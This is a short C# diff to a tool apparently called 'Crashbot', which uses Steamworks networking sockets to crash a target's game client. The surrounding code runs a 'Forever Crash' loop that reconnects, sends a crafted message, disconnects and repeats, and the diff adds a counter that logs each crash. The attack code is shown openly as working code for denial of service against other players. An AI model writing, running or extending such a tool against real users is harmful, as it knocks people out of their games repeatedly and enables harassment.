@@ -90,12 +90,14 @@ namespace Crashbot
                 Console.WriteLine($"[{DateTime.Now}] {(crashed ? "Successfully Crashed!" : "Failed to Crash. Possibly Friends Only or Private")}");
 
                 // Forever Crash
+                int count = 0;
                 while (crashed)
                 {
                     var (conn_x, _) = ConnectAndWait(target, PersistantTimeoutOptions);
                     Program.ReadOneAndSendOne(conn_x, 0, 0, 0);
                     Thread.Sleep(500);
                     Steamworks.SteamNetworkingSockets.CloseConnection(conn_x, 0, string.Empty, false);
+                    Console.WriteLine($"[{DateTime.Now}] Crashed client {++count}x");
                 }
             }
         }
@@ -147,7 +149,7 @@ namespace Crashbot
             while (true)
             {
                 IntPtr[] messagePointers = new IntPtr[maxMessages];
-                int messageCount = 1;//Steamworks.SteamNetworkingSockets.ReceiveMessagesOnConnection(connection, messagePointers, maxMessages);
+                int messageCount = 1; // Steamworks.SteamNetworkingSockets.ReceiveMessagesOnConnection(connection, messagePointers, maxMessages);
 
                 if (messageCount > 0)
                 {
